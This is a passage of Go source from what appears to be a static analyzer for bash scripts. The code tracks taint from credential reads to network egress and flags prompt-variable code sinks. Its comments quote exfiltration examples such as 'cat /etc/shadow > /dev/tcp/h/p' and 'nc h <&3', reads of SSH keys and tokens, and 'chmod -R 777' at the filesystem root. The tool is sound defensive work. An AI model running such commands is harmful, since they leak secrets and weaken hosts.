// wordHasSubst reports whether a word contains a command or process substitution.
func wordHasSubst(w *Word) bool {
	if w == nil {
		return false
	}
	for _, p := range w.Parts {
		switch p.Kind {
		case PartCmdSubst, PartProcSubst:
			return true
		case PartDblQuoted:
			for _, ip := range p.Parts {
				if ip.Kind == PartCmdSubst || ip.Kind == PartProcSubst {
					return true
				}
			}
		}
	}
	return false
}

// assigningBuiltinState applies the state component of the value-assigning
// builtins the generic emitter does not model. Each of them writes data into a
// variable exactly like an assignment, so leaving Σ untouched dropped the data's
// provenance one line before the egress that carries it (Finding 51).
func (it *interp) assigningBuiltinState(name string, argv []string, cmd *Command) {
	switch name {
	case "mapfile", "readarray":
		// The array operand (default MAPFILE) receives the lines read from
		// standard input, so it carries the input's provenance.
		target := "MAPFILE"
		if names := readVars(argv); len(names) > 0 && names[0] != "" {
			target = names[0]
		}
		taint := it.stdinTaint
		if taint.IsBottom() {
			taint = engine.TaintOf(engine.TaintUntrusted)
		}
		it.state.SetUnknown(target, taint)

	case "printf":
		// `printf -v NAME fmt args…` assigns the formatted text to NAME.
		for i := 0; i+1 < len(argv); i++ {
			if argv[i] != "-v" {
				continue
			}
			name := argv[i+1]
			if promptVars[name] && argvHasSubstText(argv[i+2:]) {
				// A prompt/trace variable assigned through printf re-executes
				// its stored substitution on the next traced command, exactly as
				// a direct assignment does (Finding 73).
				e := it.markTopEffect("prompt variable " + strconv.Quote(name) + " re-executes its value")
				pos := Pos{}
				if cmd != nil {
					pos = cmd.Pos
				}
				it.derive(e, engine.Atom{Kind: engine.AtomLiteral, Text: name, Loc: sourceLoc(pos, it.prog.File)})
			}
			it.state.SetUnknown(name, it.operandTaint(cmd))
			return
		}
	}
}

// argvHasSubstText reports whether any argument carries substitution syntax that
// the shell re-expands when the value is used as a format string.
func argvHasSubstText(args []string) bool {
	for _, a := range args {
		if strings.Contains(a, "$(") || strings.Contains(a, "`") || strings.Contains(a, "${") {
			return true
		}
	}
	return false
}

// operandTaint joins the provenance of every argument of an invocation: a builtin
// that copies its arguments into a variable (printf -v) hands that provenance on.
func (it *interp) operandTaint(cmd *Command) engine.Taint {
	t := engine.TaintBottom()
	if cmd == nil {
		return t
	}
	for _, a := range cmd.Args {
		if a != nil {
			t = t.Join(a.Taint)
		}
	}
	return t
}

// positionalState applies `set --` and `shift`, which rebind the positional
// parameters. They were modelled only inside a function body (to invalidate the
// parameters), so a top-level `set -- "$(cat …)"; curl -d "$1"` left $1 holding
// its previous, untainted value and the upload carried no provenance (Finding
// 61).
func (it *interp) positionalState(name string, argv []string, cmd *Command) {
	switch name {
	case "set":
		for i, a := range argv {
			if a != "--" {
				continue
			}
			for n := 1; n <= 9; n++ {
				it.state.Unset(strconv.Itoa(n))
			}
			for k, val := range argv[i+1:] {
				it.state.SetKnown(strconv.Itoa(k+1), val, argTaint(cmd, i+1+k))
			}
			it.state.SetUnknown("@", engine.TaintBottom())
			it.state.SetUnknown("*", engine.TaintBottom())
			return
		}
	case "shift":
		// A shift discards leading parameters, so what each name now holds is no
		// longer statically known.
		n := 1
		if len(argv) > 0 {
			if v, err := strconv.Atoi(argv[0]); err == nil && v > 0 {
				n = v
			}
		}
		for i := 1; i <= 9; i++ {
			it.state.Unset(strconv.Itoa(i))
			if i+n <= 9 {
				it.state.SetUnknown(strconv.Itoa(i), engine.TaintOf(engine.TaintUntrusted))
			}
		}
		it.state.SetUnknown("@", engine.TaintOf(engine.TaintUntrusted))
		it.state.SetUnknown("*", engine.TaintOf(engine.TaintUntrusted))
	}
}

// argTaint returns the provenance of the k-th argument of an invocation, or
// untrusted when the argument is not available (an unknown or aggregated word).
func argTaint(cmd *Command, k int) engine.Taint {
	if cmd == nil || k < 0 || k >= len(cmd.Args) || cmd.Args[k] == nil {
		return engine.TaintOf(engine.TaintUntrusted)
	}
	return cmd.Args[k].Taint
}

// arithmAssignTaint applies the assignments an arithmetic command or a `let`
// clause performs: `((x=$(cmd)))` and `let 'x=$(cmd)'` assign the expansion's
// value to x, so x carries the substituted data's provenance. Without it the
// variable stayed untainted and the upload that reads it carried no secret
// (Finding 61).
func (it *interp) arithmAssignTaint(n syntax.Node) {
	if n == nil {
		return
	}
	var taint engine.Taint
	found := false
	join := func(t engine.Taint) {
		if !found {
			taint, found = t, true
			return
		}
		taint = taint.Join(t)
	}
	syntax.Walk(n, func(x syntax.Node) bool {
		switch v := x.(type) {
		case *syntax.CmdSubst:
			join(it.subst[v].taint)
			return false
		case *syntax.ProcSubst:
			join(it.subst[v].taint)
			return false
		}
		return true
	})
	if !found {
		return
	}
	syntax.Walk(n, func(x syntax.Node) bool {
		switch v := x.(type) {
		case *syntax.BinaryArithm:
			switch v.Op {
			case syntax.Assgn, syntax.AddAssgn, syntax.SubAssgn, syntax.MulAssgn,
				syntax.QuoAssgn, syntax.RemAssgn, syntax.AndAssgn, syntax.OrAssgn,
				syntax.XorAssgn, syntax.ShlAssgn, syntax.ShrAssgn:
			default:
				return true
			}
			name, ok := simpleName(v.X)
			if !ok {
				return true
			}
			it.state.SetUnknown(name, taint)
			return true
		case *syntax.Word:
			// `let "x=$(cmd)"`: the whole operand is one word whose text carries
			// the assignment (a quoted arithmetic expression is not parsed into
			// an assignment node).
			name, ok := assignNameOfText(wordText(v))
			if !ok {
				return true
			}
			it.state.SetUnknown(name, taint)
			return true
		}
		return true
	})
}

// assignNameOfText returns the variable name of a `NAME=…` text.
func assignNameOfText(s string) (string, bool) {
	i := strings.IndexByte(s, '=')
	if i <= 0 {
		return "", false
	}
	name := s[:i]
	for j := 0; j < len(name); j++ {
		c := name[j]
		switch {
		case c == '_', c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z':
		case c >= '0' && c <= '9' && j > 0:
		default:
			return "", false
		}
	}
	return name, true
}

// simpleName returns the variable name a bare (non-subscripted) arithmetic
// operand names.
func simpleName(e syntax.ArithmExpr) (string, bool) {
	w := arithmWord(e)
	if w == nil || len(w.Parts) != 1 {
		return "", false
	}
	lit, ok := w.Parts[0].(*syntax.Lit)
	if !ok {
		return "", false
	}
	return lit.Value, true
}

// promptVars are the variables bash expands as prompts before printing or
// tracing a command; the expansion performs the command substitutions stored in
// their value. An assignment to one of them is therefore a code sink, not an
// environment write (Finding 73). The set is deliberately a constant: whether
// tracing is on cannot be bounded statically (a sourced file, BASH_ENV or a
// later `set -x` may enable it).
var promptVars = map[string]bool{
	"PS0": true, "PS1": true, "PS2": true, "PS3": true, "PS4": true,
	"PROMPT_COMMAND": true,
}

// valueReexecutes reports whether a value word re-executes code when the shell
// expands it as a prompt (or as a command language via @P). A prompt variable is
// re-expanded on every traced command, so even a single-quoted body — whose
// text is a literal `$(…)` — runs its substitution (Finding 73).
func valueReexecutes(w *syntax.Word) bool {
	if w == nil {
		return false
	}
	found := false
	syntax.Walk(w, func(n syntax.Node) bool {
		if found {
			return false
		}
		switch n.(type) {
		case *syntax.CmdSubst, *syntax.ProcSubst:
			found = true
			return false
		}
		return true
	})
	if found {
		return true
	}
	return wordHasSubstText(w)
}

// wordHasSubstText reports whether a word's text contains substitution syntax
// ($(…), `…`) or a parameter expansion — the sequences the shell re-expands when
// it treats the text as a format string.
func wordHasSubstText(w *syntax.Word) bool {
	t := wordText(w)
	return strings.Contains(t, "$(") || strings.Contains(t, "`") || strings.Contains(t, "${") ||
		strings.Contains(t, "$((")
}

// wordText concatenates the literal text of a word's parts, including the text
// of quoted parts (whose content is literal to the parser but still expanded by
// a prompt re-scan).
func wordText(w *syntax.Word) string {
	if w == nil {
		return ""
	}
	var b strings.Builder
	var walk func(parts []syntax.WordPart)
	walk = func(parts []syntax.WordPart) {
		for _, p := range parts {
			switch p := p.(type) {
			case *syntax.Lit:
				b.WriteString(p.Value)
			case *syntax.SglQuoted:
				b.WriteString(p.Value)
			case *syntax.DblQuoted:
				walk(p.Parts)
			}
		}
	}
	walk(w.Parts)
	return b.String()
}

// callFunc executes a function body. bash functions share the caller's variable
// scope — only the positional parameters are local to the call — so the body is
// executed against the caller's Σ and the state changes it performs persist.
func (it *interp) callFunc(fd *syntax.FuncDecl, argv []string, cmd *Command) {
	if fd == nil || fd.Name == nil {
		return
	}
	name := fd.Name.Value
	if it.depth >= maxFuncDepth {
		it.markTopEffect("function recursion limit reached at " + strconv.Quote(name))
		return
	}
	positional := []string{"0", "#", "@", "*", "1", "2", "3", "4", "5", "6", "7", "8", "9"}
	savedPos := make(map[string]*Var, len(positional))
	for _, n := range positional {
		savedPos[n] = it.state.Vars[n]
	}
	it.depth++
	it.state.SetKnown("0", name, engine.TaintBottom())
	it.state.SetKnown("#", strconv.Itoa(len(argv)), engine.TaintBottom())
	// The caller has already expanded each argument, provenance included: the
	// callee's positional parameters must carry it, or a credential passed to a
	// helper function is uploaded untainted (Finding 61).
	argJoin := engine.TaintBottom()
	if cmd != nil {
		for _, a := range cmd.Args {
			if a != nil {
				argJoin = argJoin.Join(a.Taint)
			}
		}
	}
	if len(argv) > 1 {
		// "$@"/"$*" expand to N separate words; joining them into one field
		// would mis-target the arguments, so keep them unknown.
		it.state.SetUnknown("@", argJoin)
		it.state.SetUnknown("*", argJoin)
	} else {
		it.state.SetKnown("@", strings.Join(argv, " "), argJoin)
		it.state.SetKnown("*", strings.Join(argv, " "), argJoin)
	}
	for i, a := range argv {
		it.state.SetKnown(strconv.Itoa(i+1), a, argTaint(cmd, i))
	}
	// A body containing shift / set -- rebinds the positional parameters; that
	// is not modelled, so invalidate them so reads degrade to ⊤ instead of
	// keeping a stale argument.
	if funcRebindsPositional(fd) {
		for i := 1; i <= 9; i++ {
			it.state.Unset(strconv.Itoa(i))
		}
		it.state.SetUnknown("@", engine.TaintBottom())
		it.state.SetUnknown("*", engine.TaintBottom())
	}
	if fd.Body != nil {
		it.execStmt(fd.Body)
	}
	it.depth--
	for _, n := range positional {
		if v := savedPos[n]; v != nil {
			it.state.Vars[n] = v
		} else {
			delete(it.state.Vars, n)
		}
	}
	if it.ctl == ctlReturn {
		it.ctl = ctlNone
	}
}

// funcRebindsPositional reports whether a function body contains a shift or a
// `set --` that rebinds the positional parameters.
func funcRebindsPositional(fd *syntax.FuncDecl) bool {
	if fd == nil || fd.Body == nil {
		return false
	}
	found := false
	syntax.Walk(fd.Body, func(n syntax.Node) bool {
		if found {
			return false
		}
		ce, ok := n.(*syntax.CallExpr)
		if !ok || len(ce.Args) == 0 {
			return true
		}
		lit, ok := firstLit(ce.Args[0])
		if !ok {
			return true
		}
		switch lit {
		case "shift":
			found = true
			return false
		case "set":
			// `set -- a b` rebinds; `set -e` does not.
			for _, w := range ce.Args[1:] {
				if v, ok := firstLit(w); ok && v == "--" {
					found = true
					return false
				}
			}
		}
		return true
	})
	return found
}

// firstLit returns the literal text of a word made up of a single unquoted
// literal part.
func firstLit(w *syntax.Word) (string, bool) {
	if w == nil || len(w.Parts) != 1 {
		return "", false
	}
	lit, ok := w.Parts[0].(*syntax.Lit)
	if !ok {
		return "", false
	}
	return lit.Value, true
}

// ===========================================================================
// Redirections
// ===========================================================================

func (it *interp) redir(r *syntax.Redirect) {
	if r == nil {
		return
	}
	it.step()
	switch r.Op {
	case syntax.RdrOut, syntax.AppOut, syntax.ClbOut, syntax.RdrAll, syntax.AppAll:
		it.redirectTarget(r, false, true)
	case syntax.RdrIn:
		it.redirectTarget(r, true, true)
	case syntax.RdrInOut:
		// <> reads and writes the same file: one redirection, so only its
		// first walk records it (a genuine second `> a` still records).
		it.redirectTarget(r, true, true)
		it.redirectTarget(r, false, false)
	case syntax.DplOut, syntax.DplIn:
		it.emit(engine.KindStdio, engine.ScopeBottom(), engine.ModeDirect, engine.CertaintyCertain, engine.TaintBottom(), it.redirectAtom(fromMvdanPos(r.Pos()), r.Op.String()))
		// A stream dupe's operand is the fd it duplicates (2>&1): record it as
		// the resolved target text; a non-numeric operand is a file
		// redirection, recorded by redirectTarget below.
		if r.Word != nil && isFdWord(r.Word) {
			if fd, ok := literalOf(r.Word); ok {
				it.recordRedir(redirOp(r), fd, true)
				// `>&3` on a descriptor an earlier `exec 3<>/dev/tcp/…` bound to
				// a socket is a network egress, not a stream dupe: report it as
				// the sink it is (Finding 23).
				if r.Op == syntax.DplOut {
					if endpoint, isSocket := it.socketFD[fd]; isSocket {
						target := engine.ScopeTop()
						if engine.HostShapedLenient(endpoint) {
							target = engine.ScopeOf(endpoint)
						}
						it.emit(engine.KindNetEgress, target, engine.ModeDirect, engine.CertaintyCertain,
							engine.TaintBottom(), it.redirectAtom(fromMvdanPos(r.Pos()), endpoint))
						it.queueEgress(len(it.effs) - 1)
					}
				}
				// `<&N` feeds the command from a descriptor whose data source the
				// analysis does not track. Degrading it to bottom-tainted stdin
				// dropped every exfiltration pair for `exec 3< SECRET; nc h <&3`,
				// so the input side is treated as secret-bearing, the same
				// conservative direction `read` takes (Finding 58).
				if r.Op == syntax.DplIn && fd != "" && fd != "0" && fd != "-" {
					it.stdinTaint = it.stdinTaint.Join(engine.TaintOf(engine.TaintSecret))
					it.stdinFed = true
				}
			}
		}
		// `>&word` / `<&word` with a non-numeric operand is bash's synonym for
		// `&>word` / `&<word`: a file redirection, not a stream dupe, so its
		// filesystem effect must be reported.
		if r.Word != nil && !isFdWord(r.Word) {
			it.redirectTarget(r, r.Op == syntax.DplIn, true)
		}
	case syntax.Hdoc, syntax.DashHdoc:
		it.heredoc(r.Hdoc)
		it.recordRedir(redirOp(r), "", true)
	case syntax.WordHdoc:
		// A here-string feeds its expanded word to the command's standard input:
		// record that provenance, or a credential substituted into it reaches
		// the sink untainted (Finding 58).
		val, known, content := it.expandLiteral(r.Word)
		if w := wordLiteralText(r.Word); engine.SecretPath(w) {
			content = content.Join(engine.TaintOf(engine.TaintSecret))
		}
		it.stdinTaint = it.stdinTaint.Join(content)
		// An empty here-string feeds nothing, so it is not a data feed.
		if !known || val != "" {
			it.stdinFed = true
		}
		it.emit(engine.KindStdio, engine.ScopeBottom(), engine.ModeDirect, engine.CertaintyCertain, engine.TaintBottom(), it.redirectAtom(fromMvdanPos(r.Pos()), r.Op.String()))
		it.recordRedir(redirOp(r), "", true)
	default:
		it.emit(engine.KindStdio, engine.ScopeBottom(), engine.ModeDirect, engine.CertaintyCertain, engine.TaintBottom(), it.redirectAtom(fromMvdanPos(r.Pos()), r.Op.String()))
		it.recordRedir(redirOp(r), "", true)
	}
}

// recordRedir appends one resolved redirection to the current statement's
// accumulation. The <> operator records once (its second walk is passed
// record=false), so two distinct-but-identical redirections of a statement
// (cmd > a > a) both survive.
func (it *interp) recordRedir(op, target string, known bool) {
	it.stmtRedirs = append(it.stmtRedirs, ExecRedirect{Op: op, Target: target, Known: known})
}

// queueEgress remembers a socket redirection whose payload provenance is only
// known once the command writing into it has been analysed.
func (it *interp) queueEgress(index int) {
	it.pendingEgress = append(it.pendingEgress, index)
}

// applyEgressTaint joins the statement's output provenance onto the socket
// redirections it opened: `/dev/tcp`/`/dev/udp` carry what the command writes to
// standard output, so the sink is as tainted as the data it transports. Without
// this the egress of `cat /etc/shadow > /dev/tcp/h/p` was bottom-tainted and no
// exfiltration pair formed, while the pipeline twin paired (Finding 23).
func (it *interp) applyEgressTaint() {
	if len(it.pendingEgress) == 0 {
		return
	}
	payload := it.stdoutTaint.Join(it.stdinTaint)
	for _, i := range it.pendingEgress {
		if i < 0 || i >= len(it.effs) {
			continue
		}
		if it.effs[i].Kind != engine.KindNetEgress {
			continue
		}
		it.effs[i].Taint = it.effs[i].Taint.Join(payload)
	}
	it.pendingEgress = nil
}

// redirOp renders a redirection operator together with its file-descriptor
// prefix when one is present (2>>, 2>&1), so the per-command view distinguishes
// which stream the redirection targets.
func redirOp(r *syntax.Redirect) string {
	if r.N != nil {
		return r.N.Value + r.Op.String()
	}
	return r.Op.String()
}

// redirectTarget emits the effect of a file redirection, recognizing the bash
// /dev/tcp and /dev/udp pseudo-files as network effects. It also records the
// resolved redirection (operator plus expanded target text) on the statement's
// accumulation, for the report's per-command view; record is false on the
// second walk of a <> so a single redirection is recorded once.
func (it *interp) redirectTarget(r *syntax.Redirect, reading, record bool) {
	w := r.Word
	val, known, taint := it.expandLiteral(w)
	if host, port, isTCP, ok := devNet(val); ok {
		kind := engine.KindNetEgress
		if reading {
			kind = engine.KindNetIngress
		}
		// The /dev/tcp construct is an explicit socket: the host token's role
		// as a destination is declared by the construct itself, so a bare
		// single-label name passes the host grammar. A known-but-unaddressable
		// token widens to ⊤ (the unresolved egress) rather than being dropped
		// — the safe side is not weakened — and an unexpanded word was already
		// ⊤. A missing port is stripped, so the target is the clean host.
		targetText := host
		if port != "" {
			targetText = host + ":" + port
		}
		if record {
			it.recordRedir(redirOp(r), targetText, known)
		}
		target := engine.ScopeTop()
		if known && engine.HostShapedLenient(host) {
			target = engine.ScopeOf(targetText)
		}
		it.emit(kind, target, engine.ModeDirect, engine.CertaintyCertain, taint, it.redirectAtom(fromMvdanPos(w.Pos()), targetText))
		// The socket carries the command's own output, whose provenance is only
		// known after the command is bound: remember the effect so the taint can
		// be joined at the end of the statement (Finding 23).
		if kind == engine.KindNetEgress {
			it.queueEgress(len(it.effs) - 1)
			// `exec 3<>/dev/tcp/h/p` binds descriptor 3 to the socket, so a later
			// `>&3` writes to it: remember the endpoint.
			if r.N != nil && r.N.Value != "" {
				if it.socketFD == nil {
					it.socketFD = map[string]string{}
				}
				it.socketFD[r.N.Value] = targetText
			}
		}
		_ = isTCP
		it.emit(engine.KindIPC, engine.ScopeBottom(), engine.ModeAmbient, engine.CertaintyLikely, taint, it.redirectAtom(fromMvdanPos(w.Pos()), targetText))
		return
	}
	if record {
		it.recordRedir(redirOp(r), val, known)
	}
	kind := engine.KindFSWrite
	if reading {
		kind = engine.KindFSRead
	}
	target := engine.ScopeBottom()
	switch {
	case !known:
		// A dynamic redirection target degrades to ⊤ — unless it is a process
		// substitution, whose read is the body's own effect (already emitted)
		// and whose content provenance is the body's: widening the read to ⊤
		// absorbed the concrete credential read and dropped the pair (Finding
		// 59) — or every dynamic part of the word is numeric-class
		// (out-$?.log), in which case the write/read is confined to the literal
		// directory named before the numeric part.
		switch {
		case reading && isProcSubstWord(w):
			// The body's own FSRead already reports the read; a bottom-scoped
			// second read here would only dilute the report.
			target = engine.ScopeBottom()
		default:
			if dir, ok := it.numericConfinedDir(w); ok {
				target = engine.ScopeOf(dir)
			} else {
				target = engine.ScopeTop()
			}
		}
	case val != "":
		target = engine.ScopeOf(val)
	}
	if reading {
		// `cmd < file` feeds the file's content to the command's standard
		// input: record its provenance so an egress fed only by the
		// redirection is still seen to carry the data out.
		content := taint
		if engine.SecretPath(val) {
			content = content.Join(engine.TaintOf(engine.TaintSecret))
		}
		it.stdinTaint = it.stdinTaint.Join(content)
		// A dynamic source or a real file is a data feed; /dev/null and an empty
		// target are not.
		switch {
		case isProcSubstWord(w), !known:
			it.stdinFed = true
		default:
			it.stdinFed = val != "" && val != "/dev/null"
		}
	}
	if isProcSubstWord(w) && reading {
		// The body's own FSRead already reports the read; emitting a second,
		// bottom-scoped one here would only dilute the report.
		return
	}
	it.emit(kind, target, engine.ModeDirect, engine.CertaintyCertain, taint, it.redirectAtom(fromMvdanPos(w.Pos()), val))
}

// devNet parses a /dev/tcp or /dev/udp pseudo-path into its host and port.
func devNet(s string) (host, port string, isTCP, ok bool) {
	const tcp, udp = "/dev/tcp/", "/dev/udp/"
	var rest string
	switch {
	case strings.HasPrefix(s, tcp):
		rest, isTCP = s[len(tcp):], true
	case strings.HasPrefix(s, udp):
		rest = s[len(udp):]
	default:
		return "", "", false, false
	}
	h, p, _ := strings.Cut(rest, "/")
	return h, p, isTCP, true
}

func (it *interp) heredoc(w *syntax.Word) {
	it.expandLiteral(w)
	pos := Pos{}
	if w != nil {
		pos = fromMvdanPos(w.Pos())
	}
	// A here-document is a real data feed on standard input, so a program that
	// reads a command language from its input must not be treated as unfed
	// (Finding 60).
	it.stdinFed = true
	it.emit(engine.KindStdio, engine.ScopeBottom(), engine.ModeDirect, engine.CertaintyCertain, engine.TaintBottom(), it.redirectAtom(pos, "<<"))
}

// ===========================================================================
// Command and process substitution
// ===========================================================================

// captureSubst executes a command-substitution body in a subshell and returns
// the stdout it folded to, together with whether that stdout is statically
// known, its provenance, and whether the body itself performed a network effect
// (the substitution's output is then content that arrived over the network).
func (it *interp) captureSubst(cs *syntax.CmdSubst) (string, bool, engine.Taint, bool) {
	if cs == nil {
		return "", true, engine.TaintBottom(), false
	}
	savedState := it.state
	savedOut, savedKnown := it.stdout, it.stdoutKnown
	savedTaint := it.stdoutTaint
	savedCtl := it.ctl
	it.state = it.state.Clone()
	it.ctl = ctlNone

	// A command substitution's stdout is the concatenation of every inner
	// statement's output, so fold them all rather than only the last. Effects
	// recorded from here on belong to the substitution's body: a NetEgress among
	// them is the evidence that its output came off the network.
	effStart := len(it.effs)
	var sb strings.Builder
	known := len(cs.Stmts) > 0
	taint := engine.TaintBottom()
	for _, s := range cs.Stmts {
		if it.ctl != ctlNone {
			break
		}
		it.stdout, it.stdoutKnown, it.stdoutTaint = "", false, engine.TaintBottom()
		it.execStmt(s)
		sb.WriteString(it.stdout)
		if !it.stdoutKnown {
			known = false
		}
		taint = taint.Join(it.stdoutTaint)
	}
	out := sb.String()
	net := stageHasNetEgress(it.effs[effStart:])

	it.state = savedState
	it.stdout, it.stdoutKnown, it.stdoutTaint = savedOut, savedKnown, savedTaint
	it.ctl = savedCtl
	return out, known, taint, net
}

// execProcSubst executes a process-substitution body in a subshell. It reports
// the body's folded stdout provenance together with whether the body performed a
// network effect, so the substitution's content (the /dev/fd the body writes to)
// carries the provenance of what it read instead of a hard-coded "untrusted"
// label — a credential read inside <(…) is then a secret source like any other
// (Finding 59).
func (it *interp) execProcSubst(ps *syntax.ProcSubst) (bool, engine.Taint) {
	if ps == nil {
		return false, engine.TaintBottom()
	}
	savedState := it.state
	savedCtl := it.ctl
	it.state = it.state.Clone()
	it.ctl = ctlNone
	effStart := len(it.effs)
	taint := engine.TaintBottom()
	for _, s := range ps.Stmts {
		if it.ctl != ctlNone {
			break
		}
		it.stdout, it.stdoutKnown, it.stdoutTaint = "", false, engine.TaintBottom()
		it.execStmt(s)
		taint = taint.Join(it.stdoutTaint)
	}
	net := stageHasNetEgress(it.effs[effStart:])
	it.state = savedState
	it.ctl = savedCtl
	return net, taint
}

// cachedSubst returns the recorded result of a command substitution already
// executed for this statement.
func (it *interp) cachedSubst(cs *syntax.CmdSubst) (substInfo, bool) {
	if cs == nil || !it.substDone[cs] {
		return substInfo{}, false
	}
	info, ok := it.subst[cs]
	return info, ok
}

// markSubstDone records that a substitution node has been executed for this
// statement.
func (it *interp) markSubstDone(n syntax.Node) {
	if it.substDone == nil {
		it.substDone = map[syntax.Node]bool{}
	}
	it.substDone[n] = true
}

// execSubstOnce executes a command substitution exactly once per statement and
// returns the folded result. Running it from the pre-scan (rather than only from
// the expander's hook) is what makes a substitution survive a sibling word part
// the vendored expander refuses (Findings 37/74).
func (it *interp) execSubstOnce(cs *syntax.CmdSubst) substInfo {
	if info, ok := it.cachedSubst(cs); ok {
		return info
	}
	out, known, taint, net := it.captureSubst(cs)
	info := substInfo{out: out, known: known, taint: taint, net: net}
	it.subst[cs] = info
	if it.substMemo != nil {
		it.substMemo[cs] = info
	}
	it.markSubstDone(cs)
	return info
}

// execProcSubstOnce executes a process substitution at most once per statement
// and records its content provenance.
func (it *interp) execProcSubstOnce(ps *syntax.ProcSubst) {
	if ps == nil || it.substDone[ps] {
		return
	}
	net, taint := it.execProcSubst(ps)
	it.subst[ps] = substInfo{
		known: false,
		taint: engine.TaintOf(engine.TaintUntrusted).Join(taint),
		net:   net,
	}
	it.markSubstDone(ps)
}

// expandSubstsIn walks a syntax subtree and expands every word it contains, so
// that any command or process substitution inside a construct the interpreter
// does not otherwise execute (an arithmetic or conditional command, a C-style
// for clause) is still executed and its effects are recorded.
func (it *interp) expandSubstsIn(n syntax.Node) {
	if n == nil {
		return
	}
	syntax.Walk(n, func(x syntax.Node) bool {
		if w, ok := x.(*syntax.Word); ok {
			it.expandFields(w)
			return false
		}
		return true
	})
}

// ===========================================================================
// Helpers
// ===========================================================================

// addNote records an explanatory note, bounded so a runaway loop cannot grow
// the list without limit.
func (it *interp) addNote(s string) {
	if len(it.notes) < maxRecorded {
		it.notes = append(it.notes, s)
	}
}

// addCmd records one resolved invocation, with the same bound as addNote.
func (it *interp) addCmd(c *Command) {
	if len(it.cmds) < maxRecorded {
		it.cmds = append(it.cmds, c)
	}
}

func dedupStrings(xs []string) []string {
	if len(xs) == 0 {
		return nil
	}
	seen := make(map[string]bool, len(xs))
	out := make([]string, 0, len(xs))
	for _, x := range xs {
		if seen[x] {
			continue
		}
		seen[x] = true
		out = append(out, x)
	}
	sort.Strings(out)
	return out
}

// stdinCodeClients are the programs that can read a command language or a
// script from their standard input: sqlite3's `.shell`/`.read`, gdb's `shell`,
// an interactive SQL client's `\!`/`COPY … FROM PROGRAM`, ssh's remote login
// shell, and the ftp/sftp prompt. The knowledge base declares the operand form
// of the same capability (`-ex`, `-c`, `COMMAND`), so a body delivered on
// standard input must reach the same ⊤ CodeExec verdict (Finding 60).
var stdinCodeClients = map[string]bool{
	"sqlite3": true, "sqlite": true, "psql": true, "mysql": true, "mariadb": true,
	"gdb": true, "lldb": true, "ssh": true, "redis-cli": true,
	"ftp": true, "sftp": true, "mongo": true, "mongosh": true,
	"sqlcmd": true, "sqlplus": true, "pscale": true,
}

// stdinCodeClient reports whether the invocation could execute a command language
// read from standard input. `ssh -n` (and `-T` with no command, which is the
// same shape) refuses to read stdin, so it is exempt: the flag is the precision
// control that shows the rule is expressible.
func stdinCodeClient(name string, argv []string) bool {
	if !stdinCodeClients[commandBase(name)] {
		return false
	}
	if commandBase(name) == "ssh" {
		for _, a := range argv {
			if a == "--" {
				break
			}
			if a == "-n" {
				return false
			}
		}
	}
	return true
}

// isProcSubstWord reports whether a redirect word is exactly a process
// substitution (`< <(cmd)`), whose read is reported by the body's own effects.
func isProcSubstWord(w *syntax.Word) bool {
	if w == nil {
		return false
	}
	for _, p := range w.Parts {
		if _, ok := p.(*syntax.ProcSubst); ok {
			return true
		}
	}
	return false
}

// credentialOperandReads reports the credential reads implied by an operand's
// text. Three shapes lose the read when the binder can only see literal words:
// a glob (`/etc/shadow*`), a brace alternative (`{/root/.ssh/id_rsa,$?}`), and a
// path relative to the shell's current directory (`cd /etc && cat shadow`). The
// operand text is split into its path-shaped fragments and each is resolved both
// as written and against Σ's PWD; a fragment that names a credential location
// contributes an FSRead, secret-tainted. Emitting the read is always the safe
// side: it can add a report entry, never remove one (Findings 8/67/70).
func (it *interp) credentialOperandReads(args []argWord) {
	for _, a := range args {
		// A literal operand's read is already reported by the binder for the
		// commands that declare a read parameter; what is missing for it is only
		// the resolution of a path relative to the shell's current directory
		// (Finding 70). A dynamic operand (a glob, a brace alternative, an
		// unknown word) has no concrete target at all, so its credential text is
		// the only evidence of the read (Findings 8/67).
		p, ok := it.credentialPathOf(a.val, a.lit)
		if !ok {
			continue
		}
		it.emit(engine.KindFSRead, engine.ScopeOf(p), engine.ModeDirect,
			engine.CertaintyCertain,
			a.taint.Join(engine.TaintOf(engine.TaintSecret)),
			it.redirectAtom(a.pos, p))
	}
}

// markRootOperands flags every literal relative operand that the shell's
// tracked working directory resolves to the filesystem root (Finding 70,
// breadth direction). The value is left exactly as written: what changes is
// that a consumer grading an effect's extent (a metadata change under
// `chmod -R`) can now resolve it to the whole host, so `cd / && chmod -R 777 .`
// is graded like `chmod -R 777 /` instead of like one exact file named ".".
//
// Only the root outcome is marked. Any other relative resolution would
// fabricate an absolute path from a working directory the analysis merely
// assumes, and the written operand is the honest target there.
func (it *interp) markRootOperands(argv []argWord) {
	if it.state.PWD == "" {
		return
	}
	for i := range argv {
		a := &argv[i]
		if !a.lit || a.val == "" {
			continue
		}
		if resolveCwd(it.state.PWD, a.val) == "/" {
			a.root = true
		}
	}
}

// credentialEnvReads reports a read of a credential-shaped environment variable
// as an EnvRead effect (Finding 7). The invocation's words are inspected BEFORE
// their values are used, because a parameter expansion names its variable and
// expansion flattens it to a value: `curl -d "$GITHUB_TOKEN"` leaves only the
// token text, and `env`-held credentials were therefore neither reported as
// reads nor treated as exfiltration sources.
//
// Only a variable this program never assigned counts: bash inherits such a
// variable from the process environment, so the read really is an environment
// read. A variable the program assigned (x=$GITHUB_TOKEN) is reported by the
// assignment path instead, with the provenance Σ recorded for it.
func (it *interp) credentialEnvReads(c *syntax.CallExpr, words []*syntax.Word) {
	seen := make(map[string]bool, 2)
	emit := func(name string, pos Pos) {
		if name == "" || seen[name] || !it.envSecretName(name) {
			return
		}
		seen[name] = true
		e := engine.Effect{
			Kind:       engine.KindEnvRead,
			Target:     engine.ScopeOf(name),
			Mode:       engine.ModeDirect,
			Certainty:  engine.CertaintyCertain,
			Taint:      engine.TaintOf(engine.TaintSecret),
			Reversible: defaultReversible(engine.KindEnvRead),
		}
		it.effs = append(it.effs, e)
		it.derive(e, engine.Atom{Kind: engine.AtomLiteral, Text: name, Loc: sourceLoc(pos, it.prog.File)})
	}
	for _, w := range words {
		it.walkEnvReadParts(w, emit)
	}
	if c == nil {
		return
	}
	for _, a := range c.Assigns {
		if a == nil {
			continue
		}
		it.walkEnvReadParts(a.Value, emit)
		if a.Array != nil {
			for _, el := range a.Array.Elems {
				if el != nil {
					it.walkEnvReadParts(el.Value, emit)
				}
			}
		}
	}
}

// envSecretName reports whether name names a credential this program does not
// hold itself: a credential-shaped variable bash inherited from the process
// environment. A variable the program assigned (x=$GITHUB_TOKEN) is not an
// environment read — its provenance is whatever Σ recorded for it.
func (it *interp) envSecretName(name string) bool {
	if name == "" || !engine.SecretEnvName(name) {
		return false
	}
